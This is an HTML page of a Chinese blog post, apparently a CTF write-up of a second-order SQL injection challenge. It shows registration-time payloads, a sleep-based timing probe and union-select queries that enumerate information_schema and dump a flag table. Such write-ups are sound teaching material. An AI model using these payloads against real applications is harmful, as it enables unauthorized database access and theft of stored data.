@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>October 2019 Twice SQL Injection | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="October 2019 Twice SQL Injection 首先查看页面源代码，未发现异常。 梳理一下程序功能逻辑。  登录	&#x2F;?action&#x3D;login 注册    &#x2F;?action&#x3D;reg 查看信息    &#x2F;?action&#x3D;index 修改信息    &#x2F;?action&#x3D;change 退出登录    &#x2F;?action&#x3D;logout  看看是否有文件包含。经简单验证后认为没有。 题目名称既然">
+<meta property="og:type" content="article">
+<meta property="og:title" content="October 2019 Twice SQL Injection">
+<meta property="og:url" content="https://rock718.github.io.git/2022/03/27/October-2019-Twice-SQL-Injection/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="October 2019 Twice SQL Injection 首先查看页面源代码，未发现异常。 梳理一下程序功能逻辑。  登录	&#x2F;?action&#x3D;login 注册    &#x2F;?action&#x3D;reg 查看信息    &#x2F;?action&#x3D;index 修改信息    &#x2F;?action&#x3D;change 退出登录    &#x2F;?action&#x3D;logout  看看是否有文件包含。经简单验证后认为没有。 题目名称既然">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rock718.github.io.git/October-2019-Twice-SQL-Injection/image-20220327095725958.png">
+<meta property="og:image" content="https://rock718.github.io.git/October-2019-Twice-SQL-Injection/image-20220327110554157.png">
+<meta property="article:published_time" content="2022-03-27T03:10:10.000Z">
+<meta property="article:modified_time" content="2022-03-27T03:10:10.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="二次注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rock718.github.io.git/October-2019-Twice-SQL-Injection/image-20220327095725958.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-October-2019-Twice-SQL-Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      October 2019 Twice SQL Injection
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p><img src="/October-2019-Twice-SQL-Injection/image-20220327095725958.png" alt="image-20220327095725958"></p>
+<p>首先查看页面源代码，未发现异常。</p>
+<p>梳理一下程序功能逻辑。</p>
+<ul>
+<li>登录	<code>/?action=login</code></li>
+<li>注册    <code>/?action=reg</code></li>
+<li>查看信息    <code>/?action=index</code></li>
+<li>修改信息    <code>/?action=change</code></li>
+<li>退出登录    <code>/?action=logout</code></li>
+</ul>
+<p>看看是否有文件包含。经简单验证后认为没有。</p>
+<p>题目名称既然提示是二次注入，那就尝试。</p>
+<p>经过测试，发现在注册<code>admin</code>和<code>admin&#39;#</code>后，当修改<code>admin&#39;#</code>的info后，<code>admin</code>的info也会被修改。</p>
+<p>猜测此处的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> info_column<span class="operator">=</span><span class="string">&#x27;$info&#x27;</span> <span class="keyword">WHERE</span> name_column<span class="operator">=</span><span class="string">&#x27;$name&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>尝试通过时间盲注，发现确实在注册用户名为<code>admin&#39;||sleep(5)#</code>的用户后，在登录时产生了延迟。</p>
+<p>也就是说可能在登录后查询info操作时也存在sql注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> info_column <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> name_column <span class="operator">=</span> <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>再尝试注册<code>admin&#39; union select &#39;1&#39;#</code></p>
+<p>发现union注入是可行的.</p>
+<p>注出数据库名为ctftraining。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema=&#x27;ctftraining&#x27;#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>有flag,news,users表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name=&#x27;flag&#x27;#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>其中flag表含flag列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27;+union+select+group_concat(flag)+from+flag#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>内容为</p>
+<p><img src="/October-2019-Twice-SQL-Injection/image-20220327110554157.png" alt="image-20220327110554157"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2022/03/27/October-2019-Twice-SQL-Injection/" data-id="cl9y4cx9i001a24fy6fenbk82" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" rel="tag">二次注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/10/31/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          Hello World
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/03/27/GXYCTF2019-BabysqliV3-0/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">[GXYCTF2019]BabysqliV3.0</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
